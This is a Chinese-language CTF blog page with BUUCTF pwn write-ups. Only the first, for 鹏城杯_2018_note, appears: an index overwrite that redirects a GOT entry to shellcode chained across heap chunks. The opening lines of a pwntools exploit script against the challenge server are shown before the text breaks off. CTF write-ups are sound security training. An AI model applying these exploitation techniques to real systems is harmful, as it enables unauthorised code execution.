<!DOCTYPE html><html lang="en"><head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    <meta name="description" content="buu的前面很多Pwn题笔者都记录在了https://blog.csdn.net/zzq487782568?type=blog并在持续更新 这里记录一些buu后面一些有意思的题目  buuctf之pwn题(持续更新)鹏城杯_2018_note查看保护  写汇编题目，漏洞点出在了下面的红框框里面  id有10个大小而在下面read_input这里可以输入0xF个，可以将index给覆盖掉，我们">
<meta property="og:type" content="article">
<meta property="og:title" content="buuctf之pwn题(持续更新)">
<meta property="og:url" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/index.html">
<meta property="og:site_name" content="z1r0's blog">
<meta property="og:description" content="buu的前面很多Pwn题笔者都记录在了https://blog.csdn.net/zzq487782568?type=blog并在持续更新 这里记录一些buu后面一些有意思的题目  buuctf之pwn题(持续更新)鹏城杯_2018_note查看保护  写汇编题目，漏洞点出在了下面的红框框里面  id有10个大小而在下面read_input这里可以输入0xF个，可以将index给覆盖掉，我们">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_note/2.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_note/1.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_note/3.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_overint/1.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_overint/2.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_overint/3.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_overint/4.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_easycalc/2.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_easycalc/1.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_easycalc/3.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/BSidesCF_2019Slowfire/1.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/BSidesCF_2019Slowfire/2.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/BSidesCF_2019Slowfire/3.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/suctf_2018_easy_overflow_file_structure/1.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/suctf_2018_easy_overflow_file_structure/2.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/suctf_2018_easy_overflow_file_structure/3.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/suctf_2018_easy_overflow_file_structure/4.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/suctf_2018_easy_overflow_file_structure/5.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/csaw2018_shell_code/1.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/csaw2018_shell_code/2.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/csaw2018_shell_code/3.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/actf_2020_scp_foundation_secret/1.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/actf_2020_scp_foundation_secret/2.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/cscctf_2019_qual_babyheap/1.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/cscctf_2019_qual_babyheap/2.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/cscctf_2019_final_babyprintf/1.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/cscctf_2019_final_babyprintf/2.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/wdb_2018_4th_pwn2/2.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/wdb_2018_4th_pwn2/3.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/wdb_2018_4th_pwn2/4.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/wdb_2018_4th_pwn2/5.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/wdb_2018_4th_pwn2/6.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/wdb_2018_4th_pwn2/1.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/greeting_mna_2016/1.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/greeting_mna_2016/2.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/web_of_sci_volga_2016/1.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/web_of_sci_volga_2016/2.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/web_of_sci_volga_2016/3.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/pwnable_free_spirit/1.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/pwnable_loveletter/1.png">
<meta property="og:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/pwnable_loveletter/2.png">
<meta property="article:published_time" content="2022-02-22T03:15:08.000Z">
<meta property="article:modified_time" content="2023-03-30T07:58:54.745Z">
<meta property="article:author" content="z1r0">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_note/2.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>buuctf之pwn题(持续更新)</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.1.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2022/01/09/changanzhanyi/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;text=buuctf之pwn题(持续更新)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=buuctf之pwn题(持续更新)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;is_video=false&amp;description=buuctf之pwn题(持续更新)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=buuctf之pwn题(持续更新)&amp;body=Check out this article: http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=buuctf之pwn题(持续更新)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=buuctf之pwn题(持续更新)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=buuctf之pwn题(持续更新)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;title=buuctf之pwn题(持续更新)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;name=buuctf之pwn题(持续更新)&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;t=buuctf之pwn题(持续更新)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0"><span class="toc-number">1.</span> <span class="toc-text">buuctf之pwn题(持续更新)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2018-note"><span class="toc-number">1.1.</span> <span class="toc-text">鹏城杯_2018_note</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2018-overint"><span class="toc-number">1.2.</span> <span class="toc-text">鹏城杯_2018_overint</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%B9%8F%E5%9F%8E%E6%9D%AF-2018-easycalc"><span class="toc-number">1.3.</span> <span class="toc-text">鹏城杯_2018_easycalc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BSidesCF-2019Slowfire"><span class="toc-number">1.4.</span> <span class="toc-text">BSidesCF_2019Slowfire</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suctf-2018-easy-overflow-file-structure"><span class="toc-number">1.5.</span> <span class="toc-text">suctf_2018_easy_overflow_file_structure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#csaw2018-shell-code"><span class="toc-number">1.6.</span> <span class="toc-text">csaw2018_shell_code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#actf-2020-scp-foundation-secret"><span class="toc-number">1.7.</span> <span class="toc-text">actf_2020_scp_foundation_secret</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cscctf-2019-qual-babyheap"><span class="toc-number">1.8.</span> <span class="toc-text">cscctf_2019_qual_babyheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cscctf-2019-final-babyprintf"><span class="toc-number">1.9.</span> <span class="toc-text">cscctf_2019_final_babyprintf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wdb-2018-4th-pwn2"><span class="toc-number">1.10.</span> <span class="toc-text">wdb_2018_4th_pwn2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#greeting-mna-2016"><span class="toc-number">1.11.</span> <span class="toc-text">greeting_mna_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-of-sci-volga-2016"><span class="toc-number">1.12.</span> <span class="toc-text">web_of_sci_volga_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-free-spirit"><span class="toc-number">1.13.</span> <span class="toc-text">pwnable_free_spirit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-loveletter"><span class="toc-number">1.14.</span> <span class="toc-text">pwnable_loveletter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-s-2"><span class="toc-number">1.15.</span> <span class="toc-text">ciscn_2019_s_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suctf2018-heap"><span class="toc-number">1.16.</span> <span class="toc-text">suctf2018_heap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qctf-2018-noleak"><span class="toc-number">1.17.</span> <span class="toc-text">qctf_2018_noleak</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-guess"><span class="toc-number">1.18.</span> <span class="toc-text">jarvisoj_guess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-bf"><span class="toc-number">1.19.</span> <span class="toc-text">pwnable_bf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cscctf-2019-qual-signal"><span class="toc-number">1.20.</span> <span class="toc-text">cscctf_2019_qual_signal</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qwb2019-one"><span class="toc-number">1.21.</span> <span class="toc-text">qwb2019_one</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0ctf2017-easiestprintf"><span class="toc-number">1.22.</span> <span class="toc-text">0ctf2017_easiestprintf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ycb-2020-easy-heap"><span class="toc-number">1.23.</span> <span class="toc-text">ycb_2020_easy_heap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hxb-pwn300"><span class="toc-number">1.24.</span> <span class="toc-text">hxb_pwn300</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-ne-6"><span class="toc-number">1.25.</span> <span class="toc-text">ciscn_2019_ne_6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-secret-of-my-heart"><span class="toc-number">1.26.</span> <span class="toc-text">pwnable_secret_of_my_heart</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-otp"><span class="toc-number">1.27.</span> <span class="toc-text">pwnable_otp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-final-9"><span class="toc-number">1.28.</span> <span class="toc-text">ciscn_2019_final_9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hack-lu-2018-heap-heaven"><span class="toc-number">1.29.</span> <span class="toc-text">hack_lu_2018_heap_heaven</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suctf-2019-playfmt"><span class="toc-number">1.30.</span> <span class="toc-text">suctf_2019_playfmt</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-dubblesort"><span class="toc-number">1.31.</span> <span class="toc-text">pwnable_dubblesort</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#whctf2017-note-sys"><span class="toc-number">1.32.</span> <span class="toc-text">whctf2017_note_sys</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#roarctf-2019-easyrop"><span class="toc-number">1.33.</span> <span class="toc-text">roarctf_2019_easyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#others-pwn1"><span class="toc-number">1.34.</span> <span class="toc-text">others_pwn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rctf2018-babyheap"><span class="toc-number">1.35.</span> <span class="toc-text">rctf2018_babyheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#arr-sun-2016"><span class="toc-number">1.36.</span> <span class="toc-text">arr_sun_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwnable-dragon"><span class="toc-number">1.37.</span> <span class="toc-text">pwnable_dragon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-calc-exe"><span class="toc-number">1.38.</span> <span class="toc-text">jarvisoj_calc.exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-sw-10"><span class="toc-number">1.39.</span> <span class="toc-text">ciscn_2019_sw_10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-final-10"><span class="toc-number">1.40.</span> <span class="toc-text">ciscn_2019_final_10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#inndy-stack"><span class="toc-number">1.41.</span> <span class="toc-text">inndy_stack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#picoctf-2018-gps"><span class="toc-number">1.42.</span> <span class="toc-text">picoctf_2018_gps</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        buuctf之pwn题(持续更新)
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
        <span itemprop="name">z1r0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-02-22T03:15:08.000Z" itemprop="datePublished">2022-02-22</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/WP/">WP</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/PWN/" rel="tag">PWN</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <font size="3">

<blockquote>
<p>buu的前面很多Pwn题笔者都记录在了<a target="_blank" rel="noopener" href="https://blog.csdn.net/zzq487782568?type=blog%E5%B9%B6%E5%9C%A8%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0">https://blog.csdn.net/zzq487782568?type=blog并在持续更新</a></p>
<p>这里记录一些buu后面一些有意思的题目</p>
</blockquote>
<h1 id="buuctf之pwn题-持续更新"><a href="#buuctf之pwn题-持续更新" class="headerlink" title="buuctf之pwn题(持续更新)"></a>buuctf之pwn题(持续更新)</h1><h2 id="鹏城杯-2018-note"><a href="#鹏城杯-2018-note" class="headerlink" title="鹏城杯_2018_note"></a>鹏城杯_2018_note</h2><p>查看保护</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_note/2.png"></p>
<p>写汇编题目，漏洞点出在了下面的红框框里面</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_note/1.png"></p>
<p>id有10个大小而在下面read_input这里可以输入0xF个，可以将index给覆盖掉，我们控制了index这个值之后可以找上面的got表对其进行修改，因为可以执行shellcode，所以我们可以控制got为一个堆，在这个堆里面布置shellcode利用jmp这个跳转再跳转到其他的堆中继续持续shellcode（此题限制每次的写到 heap 上的长度小于 13 ），然后调用这个got就可以getshell了。</p>
<p>解释一下jmp $+0x16吧。表示当前这条指令要向前跳转到距离这条指令0x16个字节的地方</p>
<p><img src="/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/%E9%B9%8F%E5%9F%8E%E6%9D%AF_2018_note/3.png"></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">27746</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">   r.sendline(<span class="string">'1'</span>)</span><br><span class="line">   